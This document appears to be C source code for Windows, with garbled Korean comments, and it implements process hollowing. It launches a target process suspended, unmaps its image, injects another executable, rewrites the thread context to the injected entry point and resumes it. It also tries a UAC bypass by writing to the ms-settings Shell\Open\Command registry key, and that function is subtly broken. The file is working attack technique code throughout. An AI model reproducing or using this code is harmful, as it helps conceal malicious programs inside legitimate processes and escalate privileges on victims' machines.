#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ShlObj.h>
#pragma comment(lib,"ntdll.lib")


EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);


BOOL RunAsAdmin(HWND hWnd, LPTSTR lpFile, LPTSTR lpParameters)
{
	SHELLEXECUTEINFO exeset;
	ZeroMemory(&exeset, sizeof(exeset));

	exeset.cbSize = sizeof(SHELLEXECUTEINFOW);
	exeset.hwnd = hWnd;
	exeset.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_FLAG_NO_UI;
	exeset.lpVerb = TEXT("runas");
	exeset.lpFile = lpFile;
	exeset.lpParameters = lpParameters;
	exeset.nShow = SW_SHOWNORMAL;

	if (!ShellExecuteEx(&exeset)){
		return FALSE;

	}
	return TRUE;
}


//UAC ��ȸ�� ���� ������ ���� �Լ� UACevasion(HKEY_LOCAL_MACHINE,"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\Command","�����ڱ������� �����ų ���α׷� ���")
BOOL UACevasion(HKEY hKeyRoot, const char* lpSubKey, char* setVal) {
	HKEY hKey = nullptr;
	LONG ret = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey); //������ �� �� ERROR_SUCCESS ��ȯ. 
	if (ret == ERROR_SUCCESS) {
		RegCloseKey(hKey); //�ڵ�ݰ� ���� 
		return TRUE;
	}
	RegSetValueEx(hKey, lpSubKey, 0, REG_SZ, (BYTE*)setVal, (DWORD)sizeof(setVal));
	
	return true;
}


int main(int argc, char* argv[]) {
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFO si; //TARTUPINFO ����ü �������� ���μ����� �Ӽ� ������ ����
	PROCESS_INFORMATION pi; //������ ���μ��� ������ ��� ����ü (���� ������ ����)

	CONTEXT tContext;
	tContext.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	if (!CreateProcess(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("\nCreateProcess false... %d \n", GetLastError());
		return 1;
	}


	//��ü�� ���α׷��� ���� �������� ����α����� CreateFile.
	hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\nCreateFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	nSizeOfFile = GetFileSize(hFile, NULL);

	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) {
		printf("\nReadFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}
	NtClose(hFile);


	//�ñ״�ó üũ
	pDosH = (PIMAGE_DOS_HEADER)image;
	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\nInvalid execute format.\n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	//DOS_HEADER�� e_lfanew �� ���ؼ� NT_HEADER�� ���� ����. IMAGE_NT_HEADER �ּ� ���
	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);

	// �ڽ����μ����� ���� �������� ���ؽ�Ʈ���.
	// pi ����ü�� ������ �κп��� ���� �������� ���¸� _CONTEXT ����ü�� �ʱ�ȭ.. �� �����������κ�
	NtGetContextThread(pi.hThread, &tContext);


	//Ÿ�� ���μ���(������) PEB�κ��� ImageBase address ���
	//ebx �������Ϳ��� PEB �ּҸ� �������� PEB���� ���� �̹����� �⺻ �ּҸ� ����
	NtReadVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);

	// ���� ���� �̹����� ��ü�� �������ϰ� �ּҰ� �����ϴٸ� �ڽ����μ������� ���� ���������� �ٷ� �������.
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) {
		if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase)
			printf("\nrebase���ʿ䰡 ����. �ٷ� ����� \n");
		NtUnmapViewOfSection(pi.hProcess, base);
	}


	// ����ε� �ּҰ����� ���ο� ������� �Ҵ�. 
	//suspended ������ ���μ����� imagebase�κп� ��ü�� ������ SizeOfImage��ŭ ���󿵿� �Ҵ�.
	// ���� �ش� �ּҺκ��� ���ε� ���¸� ����.
	printf("\n�ڽ����μ��� �ȿ� �޸𸮸� �Ҵ��Ѵ� ġ�� \n");
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		printf("\nVirtualAllocEx false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}
	printf("\n�޸� �Ҵ�. Address: %#zx\n", (SIZE_T)mem);


	// �Ҵ�� ��������� Write
	// OPTIONAL_HEADER�� Write�� �� ���� ������ŭ ��� ���ǿ� �� ����.
	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL);

	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
	}


	// CONTEXT ����ü ������ �� ������ �簡��
	//���Ե� �̹����� �������� Rcx��������
	tContext.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("New EP: %#zx\n", tContext.Rcx);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	printf("\n�ڽ����μ����� ���ν����� ���ؽ�Ʈ�� ���õ�. \n");
	NtSetContextThread(pi.hThread, &tContext);

	printf("\n�̾�~~ ResumeThread!! \n");
	NtResumeThread(pi.hThread, NULL);

	printf("\nUAC ��ȸ����. \n");
	UACevasion(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command", argv[3]); //argv[3]�� �����ų ���α׷�
	//RunAsAdmin(NULL,(LPTSTR)"evasion.exe", argv[3]);


	printf("\n��. �ڽ����μ����� ����Ǳ⸦ ��ٸ���..\n");
	//�ڽ����μ��� ����ɶ����� ����������
	NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

	NtClose(pi.hThread);
	NtClose(pi.hProcess);

	VirtualFree(image, 0, MEM_RELEASE);
	return 0;
}